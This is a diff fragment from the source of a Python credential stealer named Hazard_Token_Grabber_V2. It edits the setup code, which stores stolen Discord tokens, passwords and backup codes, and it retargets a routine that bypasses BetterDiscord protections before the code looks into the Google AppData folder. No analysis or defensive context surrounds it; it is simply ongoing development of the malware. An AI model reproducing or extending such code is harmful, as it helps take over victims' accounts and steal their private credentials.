@@ -28,8 +28,8 @@ class Hazard_Token_Grabber_V2:
         self.tokens = []
         self.discord_psw = []
         self.backup_codes = []
-
-        if os.path.exists(self.roaming+"\\BetterDiscord"):
+        
+        if os.path.exists(self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"):
             self.bypass_better_discord()
 
         if not os.path.exists(self.appdata+'\\Google'):
